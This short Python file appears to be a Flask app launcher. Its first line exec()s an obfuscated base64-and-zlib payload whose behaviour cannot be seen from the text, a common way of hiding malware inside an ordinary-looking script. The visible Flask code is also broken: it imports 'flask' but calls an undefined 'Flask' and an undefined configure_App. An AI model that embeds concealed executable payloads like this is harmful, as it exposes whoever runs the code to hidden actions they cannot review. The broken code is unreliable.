exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UN9LxDAMfl7/ir61xVo2nYceThDxQUQEzzc5jq2NWta1pe3pVPzfbdlhIAlJvnz5oSfvQsLRyRES/zZ64EMfYdXymMJeJp70BOjVBTxjbXHo7RvQpmZrVKXwlW0Vu6VZLI6e8EO8eby5322en26vH1jBCemsBZkoJU0tatGcZj2/ILzNwgpkCNCPqIJZgk+FuwwX0QB4esaQ6ZadxN76Xo6UXN0RHkUA+UEzwUu9Rao7xIahz3dtABuwVLFLk+nU0X/1eEkzBDNIWs4WCqSbfIAY6fIBMazaklRQkPyHRLKOvwz9Act0XvU=')[0])))


import flask
app = Flask(__name__)
app = configure_App(app=app) # create flask object
app.run(host='127.0.0.1', port=8000) # run
